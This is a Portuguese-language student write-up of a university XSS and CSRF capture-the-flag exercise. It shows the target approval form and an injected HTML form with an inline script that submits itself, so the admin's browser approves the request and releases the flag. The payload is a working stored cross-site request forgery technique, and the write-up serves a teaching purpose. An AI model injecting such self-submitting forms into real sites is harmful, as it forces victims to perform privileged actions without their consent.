# Trabalho realizado na Semana #6
## XSS + CSRF CTF
Começamos por entrar no site e instantaneamente nos deparamos com informação que vamos precisar de usar mais tarde, o id da request que vai ser realizada.
![Alt text](/images/4.png)
Com esta informação em mente, inserimos um texto qualquer no input para ver onde nos levaria e após alguns cliques chegamos a http://ctf-fsi.fe.up.pt:5005, a página onde o admin realiza a avaliação dos inputs.
![Alt text](/images/1.png)
![Alt text](/images/5.png)
Após analisarmos o código da página, descobrimos que o código usado para o botão Give The Flag é o seguinte, em que (id) representa o id da  request:
```
<form method="POST" action="request/(id)/approve" role="form">
    <div class="submit">
        
        <input type="submit" id="giveflag" value="Give the flag" disable="">
        
    </div>
</form>
```
Utilizando este código juntamente com algum conhecimento de javascript fizemos o seguinte código que após a parte de javascript ser lida é submetido o form que nos dará a flag do desafio:
```
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/(id)/approve" role="form">
    <div class="submit">
        
        <input type="submit" id="giveflag" value="Give the flag">
        
    </div>
    <script>
        document.forms[0].submit();
    </script>
</form>
```
Inserindo este código na zona de input com o id indicado no topo da página após termos desativado a permição de usar javascript do site, para evitar sermos redirecionados para uma página à qual não temos acesso, somos então redirecionados para a página de avaliação do input, na qual ainda não está presente a flag devido ao site não ter atualizado por não ter acesso a javascript. Após um reload rápido, a flag que pretendiamos obter está presente no topo da página.
![Alt text](/images/3.png)
![Alt text](/images/2.png)
